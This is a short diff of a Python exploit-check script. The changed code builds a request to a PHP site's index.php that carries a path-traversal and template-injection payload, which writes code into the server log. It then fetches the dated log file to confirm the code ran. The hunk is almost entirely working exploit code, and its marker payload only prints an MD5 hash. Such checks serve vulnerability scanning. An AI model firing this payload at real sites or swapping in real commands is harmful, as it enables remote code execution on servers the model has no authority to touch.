@@ -21,8 +21,7 @@ def run(url, timeout=15):
         "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
     }
     try:
-        exploit_url = urllib.parse.urljoin(url,
-                                           'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
+        exploit_url = url + '/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]'
         response = requests.get(exploit_url, headers=headers, timeout=timeout, verify=False)
         timenow = datetime.datetime.now().strftime("%y_%m_%d")
         log_url = urllib.parse.urljoin(url, f'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{timenow}.log')
